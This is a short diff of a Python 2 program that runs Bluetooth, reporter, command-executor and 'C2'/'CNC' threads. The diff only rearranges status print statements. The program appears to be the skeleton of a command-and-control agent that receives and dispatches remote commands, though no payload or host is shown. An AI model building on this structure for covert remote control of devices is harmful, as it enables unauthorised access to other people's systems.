@@ -21,15 +21,10 @@ last_report = None;
 commands_queue = Queue();
 
 def main():
-	print "loading settings..."
 	load_settings();
-	print "starting BT thread..."
-	
-	print "starting Reporter thread..."
+
 	start_new_thread( loop_reporter, ());
-	print "starting Executor thread..."
 	start_new_thread( loop_executer, ());
-	print "starting C2 thread..."
 	start_new_thread( loop_cnc, ());
 	loop_bt()
 
@@ -152,6 +147,7 @@ def loop_bt():
 
 #thread cnc
 def loop_cnc():
+	print "starting CNC thread..."
 	get_device_id();
 	while True:
 		cmds = receive_commands();
@@ -161,23 +157,25 @@ def loop_cnc():
 
 #thread reporter
 def loop_reporter():
+	print "Starting Reporter thread..."
 	get_device_id();
 	while True:
 		send_report();
+		print "Sent a report from device-"+str(device_id);
 		sleep(REPORT_SEND_INTERVAL);
 
 #thread exc
 def loop_executer():
 	from commands import dispatch
+	print "Starting Executor thread..."
 
 	while True:
-		# if commands_queue.empty():
-			# sleep(COMMAND_QUERY_INTERVAL);
-			# continue;
-
 		cmd = commands_queue.get(True);
 		dispatch(cmd);
-		commands_queue.task_done();
 
+		commands_queue.task_done();
+		print "Task completed"
+
+#main
 if __name__ == '__main__':
 	main()
